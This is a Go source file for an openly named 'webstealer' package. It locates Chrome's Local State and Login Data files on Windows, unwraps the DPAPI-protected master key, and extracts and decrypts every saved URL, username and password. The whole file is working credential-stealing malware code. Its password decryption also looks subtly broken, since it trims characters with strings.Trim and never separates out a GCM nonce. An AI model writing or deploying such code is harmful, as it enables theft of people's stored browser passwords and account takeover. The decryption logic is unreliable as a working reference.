// Package webstealer extracts credentials from browser storage.
package webstealer

import (
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"strings"

	_ "github.com/mattn/go-sqlite3" // sqlite driver

	"github.com/kahlys/codex/go/cmd/oracle/internal/cryptox"
	"github.com/kahlys/codex/go/cmd/oracle/internal/osx"
)

// ChromeStealer reads and decrypts credentials stored by Chrome.
type ChromeStealer struct {
	loginDataPath  string
	localStatePath string // json file where chrome stores master key

	masterKey []byte // master key compatible with chrome version 80 or higher
}

// NewChromeStealer builds a ChromeStealer using default profile paths.
func NewChromeStealer() ChromeStealer {
	userProfile := os.Getenv("USERPROFILE")

	loginDataPath := userProfile + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	localStatePath := userProfile + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"

	masterkey, err := chromeMasterKey(localStatePath)
	if err != nil {
		fmt.Println("WARNING: unable to get chrome master key: ", err.Error())
	}

	return ChromeStealer{
		loginDataPath:  loginDataPath,
		localStatePath: localStatePath,

		masterKey: masterkey,
	}
}

// chromeMasterKey retrieve the master key used by newest version of chrome to encrypt passwords.
func chromeMasterKey(localStatePath string) ([]byte, error) {
	byteValue, err := os.ReadFile(localStatePath)
	if err != nil {
		return []byte{}, err
	}

	result := struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}{}

	err = json.Unmarshal(byteValue, &result)
	if err != nil {
		return []byte{}, err
	}

	dpapiKey, err := base64.StdEncoding.DecodeString(result.OSCrypt.EncryptedKey)
	if err != nil {
		return []byte{}, err
	}

	// The key is encrypted using the windows DPAPI method and signed with it.
	// It looks like "DPAPI05546sdf879z456...", we remove the prefix DPAPI,
	// then we decrypt it.
	masterKey, err := cryptox.WDecrypt([]byte(strings.TrimPrefix(string(dpapiKey), "DPAPI")))
	if err != nil {
		return []byte{}, err
	}

	return masterKey, nil
}

// Run extracts stored Chrome credentials.
func (cs ChromeStealer) Run() (Results, error) {
	res := Results{}

	// check for login data file
	if !osx.IsFileExist(cs.loginDataPath) {
		log.Println("WARNING: unable to find google-chrome login data file")
		return Results{}, nil
	}

	// temporary file to store loginDataPath file content
	tempfile, err := osx.NewTempFile()
	if err != nil {
		log.Println("WARNING: unable to create temporary login data file")
		return Results{}, err
	}

	err = osx.CopyFile(cs.loginDataPath, tempfile)
	if err != nil {
		return Results{}, err
	}

	defer os.Remove(tempfile)

	// retrieve credentials
	db, err := sql.Open("sqlite3", tempfile)
	if err != nil {
		return Results{}, err
	}
	defer db.Close()

	rows, err := db.Query("select origin_url, username_value, password_value from logins")
	if err != nil {
		return Results{}, err
	}
	defer rows.Close()

	for rows.Next() {
		var cred Credential

		err = rows.Scan(&cred.URL, &cred.Username, &cred.Password)
		if err != nil {
			fmt.Println("ERROR:", err.Error())
			continue
		}

		switch {
		case strings.HasPrefix(cred.Password, "v10"): // chrome version 80 or higher
			password, err := cryptox.AesGCMDecrypt([]byte(strings.Trim(cred.Password, "v10")), cs.masterKey)
			if err != nil {
				fmt.Println("ERROR:", err.Error())
				continue
			}
			res.AddCredentials(cred.URL, cred.Username, string(password))
		default: // chrome version < 80
			password, err := cryptox.WDecrypt([]byte(cred.Password))
			if err != nil {
				fmt.Println("ERROR:", err.Error())
				continue
			}
			res.AddCredentials(cred.URL, cred.Username, string(password))
		}
	}
	return res, nil
}
